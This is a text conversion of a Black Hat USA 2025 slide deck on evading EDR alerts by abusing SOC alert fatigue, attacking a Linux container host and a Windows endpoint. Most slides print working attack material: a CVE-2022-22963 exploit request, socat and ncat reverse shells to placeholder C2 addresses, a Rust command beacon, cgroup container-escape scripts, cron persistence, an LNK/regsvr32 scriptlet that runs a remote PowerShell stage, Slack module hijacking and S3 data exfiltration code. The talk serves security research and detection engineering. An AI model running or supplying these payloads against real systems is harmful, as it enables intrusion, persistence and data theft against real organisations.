---
title: "Death by Noise Abusing Alert Fatigue to Bypass the SOC (EDR Edition)"
speakers: ["Rex Guo", "Khang Nguyen"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Rex Guo&Khang Nguyen_Death by Noise Abusing Alert Fatigue to Bypass the SOC (EDR Edition).pdf"
pages: 47
sha256: "f3342504fa153ba37551a48e6d1f0d5801807c95d3e555c83c8fb17d11d7a0ed"
text_chars: 17301
ocr_pages: 4
has_ocr: true
redacted_secrets: 0
ocr_confidence: 90.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:19:56Z"
---
# Death by Noise Abusing Alert Fatigue to Bypass the SOC (EDR Edition)

**Speakers:** Rex Guo, Khang Nguyen  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Rex Guo&Khang Nguyen_Death by Noise Abusing Alert Fatigue to Bypass the SOC (EDR Edition).pdf` (47 pages)


## Slide 1

**Death by Noise: Abusing Alert Fatigue to Bypass the SOC (EDR Edition)**

## **Rex Guo Khang Nguyen**

#BHUSA   @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AUGUST 6-7, 2025
MANDALAY BAY / LAS VEGAS
Death by Noise: Abusing Alert Fatigue to
Bypass the SOC (EDR Edition)
Rex Guo
Khang Nguyen
#BHUSA @BlackHatEvents
```

## Slide 2

# Alert Fatigue in Enterprise SOC

> 99%
Most are  medium
false positives  and  low  severity
https://expel.com/blog/alert-fatigue-burnout-turnover-lather-rinse-repeat/

**1K - 10K+ > 99%** alerts/day false positives https://www.paloaltonetworks.com/blog/2020/09/state-of-security-operations/

culminatesecurity.com

## Slide 3

# The Consequences of Alert Fatigue

**Ignore medium/low alerts**

**Shallow Suppress noisy investigations alerts** Most are **medium** and **low** severity

## Slide 4

# Is Default EDR Detection Sufficient?

- Many SOC teams rely on default EDR configuration to provide detection

- 4 principles to downgrade or avoid the detections

## Slide 5

# Rex Guo

- CEO/Co-Founder @ Culminate

   - DEFCON 2024 SOC Competition, #1 human efficiency

- Engineering @ Lacework, XMCyber, Cisco

- 4th Time @ Blackhat

## Slide 6

# Khang Nguyen

- Founding Security Researcher

- Started in binary analysis & vulnerability research

- Moved to Fullstack Exploit Dev

- Playing & hacking FPS games

## Slide 7

# Alert Severity in Chosen EDRs

- Crowdstrike: **Critical, high** , medium, low

- MS Defender: **High** , medium, low

- SentinelOne: **Malicious** , Suspicious

## Slide 8

Targeting Linux Server Workload

## Slide 9

Linux Server Threat Landscape


> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Linux Server Threat Landscape
The Hacker News
Home Data Breaches Cyber Attacks Vulnerabilities Webinars Expert Insights Contact Q
More AI, More Risk:
@ToreatLabz Is Your Organization Secure?
The latest enterprise Al trends and security best practices
SCARLETEEL Cryptojacking Campaign Exploiting AWS Fargate in Ongoing
Campaign
Jul 11,2023 & Ravie Lakshmanan
sal 2a | > GET THE
Cryptocurrency / Cloud Security
™@ Subscribe - Get Latest News
DARKREADING
Ill
EXPLORE CDR
TeamTNT Hits Docker Containers via 150K Malicious Cloud
Image Pulls
Honeypot activity exposed two credentials that the threat actor is using to host and distribute malicious container images,
security vendor says.
Editor's Choice
Resources Company
ra] aqua Platform Solutions
< Aqua Blog
Threat Alert: Kinsing Malware Attacks
Targeting Container Environments
Gal Singer
April 3, 2020
g Jai Vijayan, Contributing Writer © 3Min Read
VentureBeat Q
Events Video Speciallssues Jobs
Artificial Intelligence v Security v Data Infrastructure v Automation v Enterprise Analytics v
Guest
Jimmy Mesta, KSOC
Protecting against new @jmmesta
Kubernetes threats in 2024 and
beyond
December 10, 2023 11:15 AM
```

## Slide 10

# Linux Target Infrastructure

- Spring Cloud Function hosted inside a Docker container

   - Vulnerable to CVE-2022-22963

- Docker container hosted on an EC2 instance

- EC2 instance has EDRs installed

- EC2 instance is connected to other services

   - i.e., S3 buckets

##### AWS Infrastructure

Spring Cloud Function
Docker Container
Linux EC2 Instance
S3  S3  S3
Bucket Bucket Bucket

## Slide 11

Attack Chain Plan
Exploit  Drop Container  Establish Shell Session  Exfil Data
CVE-2022-22963 Escape Exploit from Host
Drop Shell Utility &  Escape to Host Persist on Host
Establish session

## Slide 12

# Attack Chain Attempt #1 (Cont.)

Exploit CVE-2022-22963

Drop Shell Utility & Establish session

## Slide 13

# CVE-2022-22963 Vulnerability

- Spring Cloud Function is used regularly for API gateways, serverless applications

- Uncontrolled Spring Expression Language (SpEL) evaluation leading to RCE

- Provide a crafted SpEL using routing functionality to execute commands on hosts

## Slide 14

# CVE-2022-22963 Exploit

POST /functionRouter HTTP/1.1 Host: <TARGET_SERVER> Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36

Connection: close

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec( "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /root/.taco5") Content-Type: text/plain Content-Length: 4

test

## Slide 15

# Drop Shell Utility & Establish Session

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec( "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8 6_64/socat -O /dev/shm/.taco5" )

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec( "cp /bin/bash /dev/shm/.hsabloc" )

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec( "/dev/shm/.taco5 exec:'/dev/shm/.hsab -li',pty,stderr,setsid,sigint,sane tcp:<LISTENER_IP>:4343" )

## Slide 16

# Attack Chain Attempt #1 (Cont.)

Download socat from Exploit CVE-2022-22963 Github and Establish Reverse Shell

Detection: CurlWgetMalwareDownload (High - No Block) BashReverseShell (Critical - Blocked)

## Slide 17

# Detection Observation

- CurlWgetMalwareDownload (High - no block) alert from downloading socat

   - Signature of particular socat binary?

   - Location hosting the binary (github link)?

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /root/.taco5")

- BashReverseShell (critical - block) alert from executing reverse shell with socat

   - /dev/shm/.taco5 exec:'/dev/shm/.hsab -li',pty,stderr,setsid,sigint,sane tcp:<LISTENER_IP>:4343

## Slide 18

# TTP Mutation

- Goal: avoid/downgrade critical/high detections

   - CurlWgetMalwareDownload

   - BashReverseShell

- Abstraction layer to change file signature

   - Using Rust for Beacon

- Footprint reduction

   - No obfuscation to avoid increasing entropy scoring of the binary

## Slide 19

# Rust Beacon

let response = client.get(format!("{} /bacon" , c2_url)) .send() .and_then(|r| r.text()); if let Ok(cmd) = response { let cmd = cmd.trim(); if !cmd.is_empty() { let output = if cfg!(target_os = "windows") { Command::new(" cmd" ).args(["/C", cmd] ).output() } else { Command::new(" sh" ).args(["-c", cmd] ).output() }; if let Ok(out) = output { let combined = format!( "{}\n{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr), ); let _ = client.post(format!("{} /result" , c2_url)) .body(combined) .send(); } thread:: sleep(Duration::from_secs(10));

## Slide 20

# Attack Chain Attempt #2

Exploit CVE-2022-22963

Drop & Execute Container Escape Script

Drop custom beacon to establish shell session

## Slide 21

# Container Escape (Single Script)

BASE_DIR="/" MAX_GUESS_PID=65535 SESSION_ID="brk" CGROUP_PATH="/dev/shm/.${SESSION_ID}" SCRIPT_NAME="${SESSION_ID}.sh" SCRIPT_PATH="${BASE_DIR}/${SCRIPT_NAME}" sleep 10000 &

cat > "${SCRIPT_PATH}" << __EOF__ #!/bin/sh

apt install socat cp /usr/bin/socat /home/ubuntu/.ssh/.meow cp /bin/bash /home/ubuntu/.ssh/.bang /home/ubuntu/.ssh/.meow exec:'/home/ubuntu/.ssh/.bang -li',pty,stderr,setsid,sigint,sane tcp:<C2_IP>:4343 __EOF__

GUESS_PID=1 while [ "${GUESS_PID}" -le "${MAX_GUESS_PID}" ]; do if [ $((GUESS_PID % 100)) -eq 0 ]; then echo "Process ${GUESS_PID}" fi

chmod +x "${SCRIPT_PATH}"

echo "/proc/${GUESS_PID}/root${SCRIPT_PATH}" > "${CGROUP_PATH}/release_agent" sh -c "echo \$\$ > '${CGROUP_PATH}/${SESSION_ID}/cgroup.procs'" GUESS_PID=$((GUESS_PID + 1)) done

mkdir -p "${CGROUP_PATH}" mount -t cgroup -o memory cgroup "${CGROUP_PATH}" mkdir -p "${CGROUP_PATH}/${SESSION_ID}" echo 1 > "${CGROUP_PATH}/${SESSION_ID}/notify_on_release"

sleep 1 echo "Reached max PID: ${MAX_GUESS_PID}."

## Slide 22

# Attack Chain Attempt #2 (Cont.)

Exploit CVE-2022-22963
Drop & Execute
Container Escape
Script
Drop custom beacon to
Detected:
establish shell session
ContainerEscape (High)

## Slide 23

# Detection Observation

- ContainerEscape High-Severity Alert

   - Process tree association

      - Container escape is linked to detected socat utility earlier

   - Detected at “Mount” step in container escape exploit

chmod +x "${SCRIPT_PATH}" mkdir -p "${CGROUP_PATH}" mount -t cgroup -o memory cgroup "${CGROUP_PATH}" mkdir -p "${CGROUP_PATH}/${SESSION_ID}" echo 1 > "${CGROUP_PATH}/${SESSION_ID}/notify_on_release"

## Slide 24

# TTP Mutation

• Goal: downgrade the ContainerEscape high-severity alert

- Reduce TTP Footprint

   - Refactor container escape exploits into different scripts

## Slide 25

# Container Escape (Refactored to 4 Scripts)

#!/bin/sh #!/bin/sh . ./.1_setupenv BASE_PATH="/tmp" sleep 1000 & MAX_SCAN=10000 CG_NAME="hawk" cat > "${WRAPPER_PATH}" << __EOF__ CG_MOUNT="/tmp/.cgshadow" #!/bin/sh WRAPPER_NAME="${CG_NAME}_wrap.sh" DEC="\$(dirname \$0)/.tmp_\$\$" WRAPPER_PATH="${BASE_PATH}/${WRAPPER_NAME}" echo "${ENC}" | base64 -d > "\$DEC" OUTPUT_NAME="${CG_NAME}_log.txt" chmod +x "\$DEC" OUTPUT_PATH="${BASE_PATH}/${OUTPUT_NAME}" "\$DEC" ENC="..." rm -f "\$DEC" __EOF__ export BASE_PATH MAX_SCAN CG_NAME CG_MOUNT WRAPPER_NAME WRAPPER_PATH OUTPUT_NAME OUTPUT_PATH ENC chmod +x "${WRAPPER_PATH}" #!/bin/sh . ./.1_setupenv INDEX=1 while [ ! -f "${OUTPUT_PATH}" ]; do if [ $((INDEX % 100)) -eq 0 ]; then echo "[*] PID: ${INDEX}" #!/bin/sh if [ "${INDEX}" -gt "${MAX_SCAN}" ]; then echo "[!] Reached PID limit (${MAX_SCAN}), aborting." . ./.1_setupenv exit 1 fi mkdir -p "${CG_MOUNT}" fi mount -t cgroup -o memory cgroup "${CG_MOUNT}" mkdir -p "${CG_MOUNT}/${CG_NAME}" echo "/proc/${INDEX}/root${WRAPPER_PATH}" > "${CG_MOUNT}/release_agent" echo 1 > "${CG_MOUNT}/${CG_NAME}/notify_on_release" sh -c "echo \$\$ > '${CG_MOUNT}/${CG_NAME}/cgroup.procs'" INDEX=$((INDEX + 1)) done sleep 1 cat "${OUTPUT_PATH}"

## Slide 26

# Attack Chain Attempt #3 (Cont.)

Exploit CVE-2022-22963

Drop refactored code Exfil S3 Bucket data to escape container & from the host using establish shell on host custom binary Drop beacon & Persist on host with establish session cron

## Slide 27

# Persistence on Host

- Leveraging living-off-the-land and masquerading principle to set up and execute cronjob from the generated bash script embedded in the heredoc earlier

   - Living-off-the-land:

      - Leverage package manager to install ncat

   - Set up cron job with crontab command

- Masquerading:

   - Copy and rename ncat and bash

## Slide 28

# Persistence on Host (Cont.)

[...] ENC="..." [...]

#!/bin/sh apt install ncat -y cp /usr/bin/ncat /home/ubuntu/.ssh/.meow cp /bin/bash /home/ubuntu/.ssh/.turtle (crontab -l 2>/dev/null; echo "* * * * * /home/ubuntu/.ssh/.meow <C2-IP> 4343 -e /home/ubuntu/.ssh/.turtle") | crontab - LOGFILE=$(dirname $0)/hawk_log.txt ps -eaf > $LOGFILE 2>&1

#!/bin/sh . ./.1_setupenv sleep 1000 & cat > "${WRAPPER_PATH}" << __EOF__ #!/bin/sh DEC="\$(dirname \$0)/.tmp_\$\$" echo "${ENC}" | base64 -d > "\$DEC" chmod +x "\$DEC" "\$DEC" rm -f "\$DEC" __EOF__ chmod +x "${WRAPPER_PATH}"

## Slide 29

# Exfil Data from S3 Buckets

- Create custom binary using following principles:

   - Living-off-the-land: leveraging AWS SDK

   - Abstraction layer: Using Rust SDK

match cli.command { Commands::ListS3 { access_key, secret_key } => { list_s3_buckets(access_key, secret_key).await? }

Commands::CreateAccessKey { user } => create_access_key(&user).await?,

Commands::DownloadBucket { bucket, output_dir, access_key, secret_key } => {

download_bucket(&bucket, &output_dir, access_key, secret_key).await?

    }
}

## Slide 30

# Final Result

• No alert on Crowdstrike Falcon

• Suspicious/non-block for SentinelOne (release_agent container escape)

• No alert on Defender

## Slide 31

# Detect or not Detect?

Efficacy container escape (cgroup release_agent) from unusual processes Generic detection

Specific detection

reverse shell utility
installation from
package manager
binary copied from
default location

## Slide 32

Targeting Windows Endpoint

## Slide 33

Windows Endpoint Threat Landscape


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows Endpoint Threat Landscape
po ema The Hacker News
— Home inars Expert Insights Contact Q =
Qakbot Being Distributed as ISO Files Instead of Excel seco? a ean
Macro
APT29 Deploys GRAPELOADER Malware Targeting European Diplomats
Through Wine-Tasting Lures
SEC U RELIST by Kaspersky CompanyAccount Get In Touch Dark mode off
Industries Products
= Content menu ™®!) Subscribe
Lazarus group evolves its infection chain with old and new malware
```

## Slide 34

# Windows Endpoint Target

- A regular user & administrator

- Windows machine has a vulnerable custom service installed by admin

#### Windows Machine

#### Standard User

- Some applications installed

#### Administrator

   - Office, Slack, etc

- OneDrive backup

- EDRs installed

ITMonitor Service

## Slide 35

# Attack Chain Plan

User download & Enumerate system Exfil data double-click ISO file services User double-click fake PDF Exploit vulnerable service file & shell session to escalate privilege & established persist

## Slide 36

# Attack Chain Attempt #1

User download & double-click ISO file

User double-click fake PDF file & shell session established

## Slide 37

Generating ISO File (v2)


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Generating ISO File (v2)
PS C:\Users\ \Desktop> &
OSCDIMG 2.56 CD-ROM and DVD-ROM Premastering Utility
Copyright (C) Microsoft, 1993-2012. All rights reserved.
Licensed only for producing Microsoft authorized content.
Scanning source tree
Scanning source tree complete (2 files in 1 directories)
Computing directory information complete
Image file is 47104 bytes
Writing 2 files in 1 directories to Meeting Invitation.iso
100% complete
Final image file is 47104 bytes
WARNING: This image contains filenames and/or directory names that are
NOT COMPATIBLE with Windows NT 3.51. If compatibility with
Windows NT 3.51 is required, use the -nt switch rather than
the -n switch.
|} Name Date modified Type Size
m
co
| |Document.txt 5/21/2025 1:41 Ph ext Docum
| Invitation Letter.pdf 5
```

## Slide 38

# Generating LNK File (v2)

$shortcutPath = "$env:USERPROFILE\src\powershell\ Meeting Invitation.pdf.lnk"

$WshShell = New-Object -ComObject WScript.Shell

$Shortcut = $WshShell.CreateShortcut($shortcutPath) $Shortcut.TargetPath = " regsvr32.exe"

$Shortcut.Arguments = "/s /n /u /i: Document.txt scrobj.dll"

$Shortcut.IconLocation = "C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe"

$Shortcut.Save()

<scriptlet>

- [...]

var sh = new ActiveXObject("WScript.Shell");

var com = "powershell -w hidden -nop -c \"iex (iwr 'http://<C2-SERVER> /stage1.ps1' )\""; sh.Run(com, 0, false);

[...]

</scriptlet>

## Slide 39

# Attack Chain Attempt #1 (Cont.)

User download & double-click ISO file

Detected by Defender: Suspicious LNK execution from container (Low - No Block)

User double-click fake PDF Detected by Falcon: file PShellDownload (Medium - Blocked)

## Slide 40

# Detection Observations & Mutations

- Observation: Falcon generated a medium severity (block) alert for powershell running remote scripts in memory

• Goal: Avoid “PShellDownload” medium severity (block) alert

- Mutations:

   - Abstraction layer:

      - Leveraging Rust and nodejs

   - Reducing TTP Footprint:

      - No obfuscation to avoid increasing entropy scoring of the payload

   - Living-off-the-land

      - Hijacking Slack

## Slide 41

# Electron App Hijacking

use napi_derive::napi; [...] #[napi] pub fn run_remote_command() { [...] let output = if cfg!(target_os = "windows") { Command::new("cmd").args(["/C", cmd]).output() } else { Command::new("sh").args(["-c", cmd]).output() }; [...] thread::sleep(Duration::from_secs(SLEEP_SECONDS)); } } copy target\release \remote_exec_bacon.dll index.node

/c copy /Y index.node %USERPROFILE%\AppData\Local\slack\app-4.45.64\resources\app.asar.unpacked\node_modules\ registry-js\ build\Release\registry.node

## Slide 42

# Attack Chain Attempt #2

User download & double-click ISO file

User double-click fake PDF file

node extension dropped in module directory & executed to establish shell session when Slack is launched

Enumerate system services & exploit vulnerable service to escalate privilege & persist

Exfil Data

## Slide 43

# Enumerate & Exploit System Service

Get-WmiObject -Class Win32_Service | Select-Object Name, [...] DisplayName, State, StartMode, PathName use windows_service::{ [...] }; const SERVICE_NAME: &str = "ITMonitor"; define_windows_service!(ffi_service_main, my_service_main); fn main() -> Result<(), windows_service::Error> { [...] } Name        : ITMonitor fn my_service_main(_arguments: Vec<OsString>) { DisplayName : ITMonitor [...] State       : Running } StartMode   : Auto PathName    : C:\ITService\IT Tools\itmonitor_service.exe fn run_service() -> Result<(), Box<dyn std::error::Error>> { [...] let launcher_script = r#" try { iex (iwr 'http://<C2-Server>/stage1_service.ps1' -UseBasicParsing) } catch { $_ | Out-File -FilePath C:\\Temp\\ps_error.txt -Append } "#; [...] fn register_control_handler(running: Arc<AtomicBool>) -> Result<ServiceStatusHandle, windows_service::Error> { [...]

## Slide 44

# Exfil Data

- Search Documents directory for document extensions

".doc", ".pdf", ".xls", ".docx", ".xlsx", ".ppt", ".pptx”

- Upload files to S3

## Slide 45

Detection Result

## Slide 46

# Detect or not Detect?

Efficacy file creation with filename containing .pdf but ends with .lnk Specific detection Generic detection

Specific detection unusual process writing into unquoted service path unusual process writing into electron app directory

## Slide 47

# Takeaways

### Attackers

- To downgrade and/or avoid out of the box EDR alerts:

   - Living-off-the-land

   - Footprint Reduction

   - Abstraction

   - Masquerading

### SOC Teams

- Custom detection

   - No detection: attacks slip through

   - Detection: handle more noise

- Detection coverage improvement can result in more alerts

   - Leveraging automation and AI agent for investigation

For questions and discussions, happy to connect
